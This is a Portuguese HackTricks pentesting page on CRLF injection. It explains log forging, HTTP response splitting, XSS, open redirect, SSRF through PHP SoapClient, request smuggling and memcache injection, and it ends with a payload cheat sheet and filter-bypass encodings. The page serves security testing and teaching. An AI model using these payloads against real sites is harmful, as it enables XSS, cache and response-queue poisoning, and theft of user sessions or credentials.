# Inje√ß√£o de CRLF (%0D%0A)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

* Voc√™ trabalha em uma **empresa de seguran√ßa cibern√©tica**? Voc√™ quer ver sua **empresa anunciada no HackTricks**? ou voc√™ quer ter acesso √† **√∫ltima vers√£o do PEASS ou baixar o HackTricks em PDF**? Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Descubra [**A Fam√≠lia PEASS**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
* **Junte-se ao** [**üí¨**](https://emojipedia.org/speech-balloon/) [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe suas t√©cnicas de hacking enviando PRs para o** [**reposit√≥rio hacktricks**](https://github.com/carlospolop/hacktricks) **e para o** [**reposit√≥rio hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

<img src="../.gitbook/assets/image (1) (1) (1) (1).png" alt="" data-size="original">

Se voc√™ est√° interessado em **carreira de hacking** e hackear o imposs√≠vel - **estamos contratando!** (_flu√™ncia em polon√™s escrito e falado √© necess√°ria_).

{% embed url="https://www.stmcyber.com/careers" %}

## O que √© CRLF?

Quando um navegador envia uma solicita√ß√£o para um servidor web, o servidor web responde com uma resposta contendo tanto os cabe√ßalhos de resposta HTTP quanto o conte√∫do real do site, ou seja, o corpo da resposta. Os cabe√ßalhos HTTP e a resposta HTML (o conte√∫do do site) s√£o separados por uma combina√ß√£o espec√≠fica de caracteres especiais, ou seja, um retorno de carro e uma alimenta√ß√£o de linha. Em resumo, eles tamb√©m s√£o conhecidos como CRLF.

O servidor web usa o CRLF para entender quando um novo cabe√ßalho HTTP come√ßa e outro termina. O CRLF tamb√©m pode informar a um aplicativo da web ou usu√°rio que uma nova linha come√ßa em um arquivo ou em um bloco de texto. Os caracteres CRLF s√£o uma mensagem padr√£o HTTP/1.1, portanto, s√£o usados por qualquer tipo de servidor web, incluindo Apache, Microsoft IIS e todos os outros.\
De [https://www.netsparker.com/blog/web-security/crlf-http-header/#](https://www.netsparker.com/blog/web-security/crlf-http-header/)

### O que √© a Vulnerabilidade de Inje√ß√£o de CRLF?

Em um ataque de vulnerabilidade de inje√ß√£o de CRLF, o invasor insere os caracteres de retorno de carro e alimenta√ß√£o de linha na entrada do usu√°rio para enganar o servidor, o aplicativo da web ou o usu√°rio a pensar que um objeto foi encerrado e outro come√ßou. Como tal, as sequ√™ncias de CRLF n√£o s√£o caracteres maliciosos, no entanto, podem ser usadas para fins maliciosos, para divis√£o de resposta HTTP, etc.

## Inje√ß√£o de CRLF em aplicativos da web

Em aplicativos da web, uma inje√ß√£o de CRLF pode ter impactos graves, dependendo do que o aplicativo faz com itens individuais. Os impactos podem variar desde a divulga√ß√£o de informa√ß√µes at√© a execu√ß√£o de c√≥digo, uma vulnerabilidade de seguran√ßa direta do aplicativo da web. Na verdade, um ataque de inje√ß√£o de CRLF pode ter repercuss√µes muito graves em um aplicativo da web, mesmo que nunca tenha sido listado no Top 10 da OWASP. Por exemplo, tamb√©m √© poss√≠vel manipular arquivos de log em um painel de administra√ß√£o, conforme explicado no exemplo abaixo.

#### Um exemplo de Inje√ß√£o de CRLF em um arquivo de log

Imagine um arquivo de log em um painel de administra√ß√£o com o padr√£o de fluxo de sa√≠da de IP - Hora - Caminho visitado, como abaixo:
```
123.123.123.123 - 08:15 - /index.php?page=home
```
Se um invasor conseguir injetar os caracteres CRLF na solicita√ß√£o HTTP, ele poder√° alterar o fluxo de sa√≠da e falsificar as entradas de log. Ele pode alterar a resposta da aplica√ß√£o web para algo como o seguinte:
```
/index.php?page=home&%0d%0a127.0.0.1 - 08:15 - /index.php?page=home&restrictedaction=edit
```
O %0d e o %0a s√£o as formas codificadas em URL de CR e LF. Portanto, as entradas de log ficariam assim depois que o invasor inserisse esses caracteres e a aplica√ß√£o os exibisse:

IP - Hora - Caminho visitado
```
123.123.123.123 - 08:15 - /index.php?page=home&
127.0.0.1 - 08:15 - /index.php?page=home&restrictedaction=edit
```
Portanto, ao explorar uma vulnerabilidade de inje√ß√£o CRLF, o invasor pode falsificar entradas no arquivo de log para obscurecer suas pr√≥prias a√ß√µes maliciosas. O invasor est√° literalmente sequestrando a p√°gina e modificando a resposta. Por exemplo, imagine um cen√°rio em que o invasor tem a senha de administrador e executou o par√¢metro restrictedaction, que s√≥ pode ser usado por um administrador.

O problema √© que se o administrador perceber que um IP desconhecido usou o par√¢metro restrictedaction, perceber√° que algo est√° errado. No entanto, como agora parece que o comando foi emitido pelo localhost (e, portanto, provavelmente por algu√©m que tem acesso ao servidor, como um administrador), n√£o parece suspeito.

Toda a parte da consulta que come√ßa com %0d%0a ser√° tratada pelo servidor como um √∫nico par√¢metro. Depois disso, h√° outro & com o par√¢metro restrictedaction, que ser√° analisado pelo servidor como outro par√¢metro. Efetivamente, esta seria a mesma consulta que:
```
/index.php?page=home&restrictedaction=edit
```
### Inje√ß√£o de Resposta HTTP

#### Descri√ß√£o

Uma vez que o cabe√ßalho de uma resposta HTTP e seu corpo s√£o separados por caracteres CRLF, um atacante pode tentar injet√°-los. Uma combina√ß√£o de CRLFCRLF informar√° ao navegador que o cabe√ßalho termina e o corpo come√ßa. Isso significa que ele agora pode escrever dados dentro do corpo da resposta, onde o c√≥digo HTML √© armazenado. Isso pode levar a uma vulnerabilidade de Cross-site Scripting.

#### Um exemplo de Inje√ß√£o de Resposta HTTP levando a XSS

Imagine uma aplica√ß√£o que define um cabe√ßalho personalizado, por exemplo:
```
X-Your-Name: Bob
```
O valor do cabe√ßalho √© definido por meio de um par√¢metro get chamado "name". Se n√£o houver codifica√ß√£o de URL em vigor e o valor for refletido diretamente dentro do cabe√ßalho, pode ser poss√≠vel para um invasor inserir a combina√ß√£o mencionada acima de CRLFCRLF para informar ao navegador que o corpo da solicita√ß√£o come√ßa. Dessa forma, ele √© capaz de inserir dados, como carga √∫til XSS, por exemplo:
```
?name=Bob%0d%0a%0d%0a<script>alert(document.domain)</script>
```
O exemplo acima exibir√° uma janela de alerta no contexto do dom√≠nio atacado.

#### Um exemplo de HTTP Response Splitting levando a um redirecionamento

{% embed url="https://medium.com/bugbountywriteup/bugbounty-exploiting-crlf-injection-can-lands-into-a-nice-bounty-159525a9cb62" %}

Navegador para:
```
/%0d%0aLocation:%20http://myweb.com
```
E o servidor responde com o cabe√ßalho:
```
Location: http://myweb.com
```
**Outro exemplo: (de** [**https://www.acunetix.com/websitesecurity/crlf-injection/**](https://www.acunetix.com/websitesecurity/crlf-injection/)**)**
```
http://www.example.com/somepage.php?page=%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:%20text/html%0d%0aContent-Length:%2025%0d%0a%0d%0a%3Cscript%3Ealert(1)%3C/script%3E
```
#### No caminho do URL

Voc√™ pode enviar a carga √∫til **dentro do caminho do URL** para controlar a **resposta** do servidor:
```
http://stagecafrstore.starbucks.com/%3f%0d%0aLocation:%0d%0aContent-Type:text/html%0d%0aX-XSS-Protection%3a0%0d%0a%0d%0a%3Cscript%3Ealert%28document.domain%29%3C/script%3E
http://stagecafrstore.starbucks.com/%3f%0D%0ALocation://x:1%0D%0AContent-Type:text/html%0D%0AX-XSS-Protection%3a0%0D%0A%0D%0A%3Cscript%3Ealert(document.domain)%3C/script%3E
```
{% embed url="https://github.com/EdOverflow/bugbounty-cheatsheet/blob/master/cheatsheets/crlf.md" %}

### Inje√ß√£o de Cabe√ßalho HTTP

#### Descri√ß√£o

Ao explorar uma inje√ß√£o CRLF, um invasor tamb√©m pode inserir cabe√ßalhos HTTP que podem ser usados para derrotar mecanismos de seguran√ßa, como o filtro XSS do navegador ou a mesma pol√≠tica de origem. Isso permite que o invasor obtenha informa√ß√µes confidenciais, como tokens CSRF. Ele tamb√©m pode definir cookies que podem ser explorados ao fazer login da v√≠tima na conta do invasor ou explorando vulnerabilidades de [cross-site scripting (XSS)](https://www.netsparker.com/blog/web-security/cross-site-scripting-xss/) de outra forma inexplor√°veis.

#### Um exemplo de Inje√ß√£o de Cabe√ßalho HTTP para extrair dados sens√≠veis

Se um invasor puder injetar os cabe√ßalhos HTTP que ativam o CORS (Compartilhamento de Recursos de Origem Cruzada), ele pode usar o JavaScript para acessar recursos que s√£o protegidos pela pol√≠tica de mesma origem, que impede que sites de origens diferentes acessem uns aos outros.

### Nova solicita√ß√£o HTTP em SSRF

Ao abusar da inje√ß√£o CRLF, voc√™ pode **criar uma nova solicita√ß√£o HTTP e injet√°-la**.\
Um bom exemplo pode ser feito usando o gadget de desserializa√ß√£o `SoapClient` em PHP. Essa classe √© **vulner√°vel a CRLF** dentro do par√¢metro `user_agent`, permitindo **inserir novos cabe√ßalhos e conte√∫do do corpo**. No entanto, voc√™ tamb√©m pode ser capaz de abusar dessa vulnerabilidade para **injetar uma nova solicita√ß√£o HTTP:**
```php
$target = 'http://127.0.0.1:9090/test'; 
$post_string = 'variable=post value';
$crlf = array(
    'POST /proxy HTTP/1.1',
    'Host: local.host.htb',
    'Cookie: PHPSESSID=[PHPSESSID]',
    'Content-Type: application/x-www-form-urlencoded',
    'Content-Length: '.(string)strlen($post_string),
    "\r\n",
    $post_string
);

$client = new SoapClient(null,
    array(
        'uri'=>$target,
        'location'=>$target,
        'user_agent'=>"IGN\r\n\r\n".join("\r\n",$crlf)
    )
);

#Put a nc listening in port 9090
$client->__soapCall("test", []);
```
### Inje√ß√£o de Cabe√ßalho para Request Smuggling

Voc√™ pode injetar cabe√ßalhos essenciais para garantir que o **back-end mantenha a conex√£o aberta** ap√≥s responder √† solicita√ß√£o inicial:
```
GET /%20HTTP/1.1%0d%0aHost:%20redacted.net%0d%0aConnection:%20keep-alive%0d%0a%0d%0a HTTP/1.1
```
Em seguida, **especifique uma segunda solicita√ß√£o**. Aqui voc√™ tem um [**ataque cl√°ssico**](http-request-smuggling/) de **inje√ß√£o de solicita√ß√£o** com **cabe√ßalhos/corpo extras** adicionados pelo servidor ap√≥s a inje√ß√£o.\
Aqui est√£o duas das muitas op√ß√µes para explora√ß√£o entre usu√°rios.

Especificar um **prefixo malicioso** para envenenar a solicita√ß√£o do pr√≥ximo usu√°rio ou um cache da web:

`GET /%20HTTP/1.1%0d%0aHost:%20redacted.net%0d%0aConnection:%20keep-alive%0d%0a%0d%0aGET%20/redirplz%20HTTP/1.1%0d%0aHost:%20oastify.com%0d%0a%0d%0aContent-Length:%2050%0d%0a%0d%0a HTTP/1.1`

Ou criando nosso prefixo para combinar com o lixo final e criar uma segunda solicita√ß√£o completa para acionar a **envenenamento da fila de resposta**.

`GET /%20HTTP/1.1%0d%0aHost:%20redacted.net%0d%0aConnection:%20keep-alive%0d%0a%0d%0aGET%20/%20HTTP/1.1%0d%0aFoo:%20bar HTTP/1.1`

Para obter mais informa√ß√µes sobre essa t√©cnica e problemas potenciais, [**verifique a fonte original**](https://portswigger.net/research/making-http-header-injection-critical-via-response-queue-poisoning).

### Inje√ß√£o de Memcache

Memcache √© um **armazenamento de chave-valor que usa um protocolo de texto claro**. Mais informa√ß√µes em:

{% content-ref url="../network-services-pentesting/11211-memcache/" %}
[11211-memcache](../network-services-pentesting/11211-memcache/)
{% endcontent-ref %}

Se uma plataforma est√° **recebendo dados de uma solicita√ß√£o HTTP e usando-os sem sanitiza√ß√£o** para realizar **solicita√ß√µes** a um servidor **memcache**, um invasor pode abusar desse comportamento para **injetar novos comandos memcache**.

Por exemplo, na vulnerabilidade original descoberta, as chaves de cache eram usadas para retornar o IP e a porta a que um usu√°rio deveria se conectar, e os invasores foram capazes de **injetar comandos memcache** que **envenenariam** o **cache para enviar os detalhes das v√≠timas** (incluindo nomes de usu√°rio e senhas) para os servidores do invasor:

<figure><img src="../.gitbook/assets/image (6) (1).png" alt=""><figcaption></figcaption></figure>

Al√©m disso, os pesquisadores tamb√©m descobriram que poderiam dessincronizar as respostas do memcache para enviar os IPs e portas dos invasores para usu√°rios cujo e-mail o invasor n√£o conhecia:

<figure><img src="../.gitbook/assets/image (40).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/image (39).png" alt=""><figcaption></figcaption></figure>

**Para obter todas as informa√ß√µes, leia o** [**artigo original**](https://www.sonarsource.com/blog/zimbra-mail-stealing-clear-text-credentials-via-memcache-injection/)\*\*\*\*

## Impactos da Vulnerabilidade de Inje√ß√£o de CRLF

O impacto das inje√ß√µes de CRLF varia e inclui todos os impactos do Cross-site Scripting √† divulga√ß√£o de informa√ß√µes. Tamb√©m pode desativar certas restri√ß√µes de seguran√ßa, como filtros XSS e a Pol√≠tica de Mesma Origem nos navegadores da v√≠tima, deixando-os suscet√≠veis a ataques maliciosos.

### Como Prevenir Inje√ß√µes de CRLF / Cabe√ßalho HTTP em Aplica√ß√µes Web

A melhor t√©cnica de preven√ß√£o √© n√£o usar a entrada do usu√°rio diretamente nos cabe√ßalhos de resposta. Se isso n√£o for poss√≠vel, voc√™ deve sempre usar uma fun√ß√£o para codificar os caracteres especiais CRLF. Outra boa pr√°tica de seguran√ßa de aplicativos da web √© atualizar sua linguagem de programa√ß√£o para uma vers√£o que n√£o permita CR e LF serem injetados em fun√ß√µes que definem cabe√ßalhos HTTP.

### CHEATSHEET
```
1. HTTP Response Splitting
‚Ä¢ /%0D%0ASet-Cookie:mycookie=myvalue (Check if the response is setting this cookie)

2. CRLF chained with Open Redirect
‚Ä¢ //www.google.com/%2F%2E%2E%0D%0AHeader-Test:test2 
‚Ä¢ /www.google.com/%2E%2E%2F%0D%0AHeader-Test:test2
‚Ä¢ /google.com/%2F..%0D%0AHeader-Test:test2
‚Ä¢ /%0d%0aLocation:%20http://example.com

3. CRLF Injection to XSS
‚Ä¢ /%0d%0aContent-Length:35%0d%0aX-XSS-Protection:0%0d%0a%0d%0a23
‚Ä¢ /%3f%0d%0aLocation:%0d%0aContent-Type:text/html%0d%0aX-XSS-Protection%3a0%0d%0a%0d%0a%3Cscript%3Ealert%28document.domain%29%3C/script%3E

4. Filter Bypass
‚Ä¢ %E5%98%8A = %0A = \u560a
‚Ä¢ %E5%98%8D = %0D = \u560d
‚Ä¢ %E5%98%BE = %3E = \u563e (>)
‚Ä¢ %E5%98%BC = %3C = \u563c (<)
‚Ä¢ Payload = %E5%98%8A%E5%98%8DSet-Cookie:%20test
```
## Ferramenta

{% embed url="https://github.com/dwisiswant0/crlfuzz" %}

## Lista de Detec√ß√£o de Brute-Force

{% embed url="https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/crlf.txt" %}

## Refer√™ncias

* [**https://www.acunetix.com/websitesecurity/crlf-injection/**](https://www.acunetix.com/websitesecurity/crlf-injection/)
* [**https://portswigger.net/research/making-http-header-injection-critical-via-response-queue-poisoning**](https://portswigger.net/research/making-http-header-injection-critical-via-response-queue-poisoning)

<img src="../.gitbook/assets/image (1) (1) (1) (1).png" alt="" data-size="original">

Se voc√™ est√° interessado em **carreira de hacking** e hackear o inquebr√°vel - **estamos contratando!** (_flu√™ncia em polon√™s escrita e falada √© necess√°ria_).

{% embed url="https://www.stmcyber.com/careers" %}

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

* Voc√™ trabalha em uma **empresa de seguran√ßa cibern√©tica**? Voc√™ quer ver sua **empresa anunciada no HackTricks**? ou voc√™ quer ter acesso √† **√∫ltima vers√£o do PEASS ou baixar o HackTricks em PDF**? Verifique os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Descubra [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
* **Junte-se ao** [**üí¨**](https://emojipedia.org/speech-balloon/) [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe suas t√©cnicas de hacking enviando PRs para o** [**reposit√≥rio hacktricks**](https://github.com/carlospolop/hacktricks) **e** [**reposit√≥rio hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
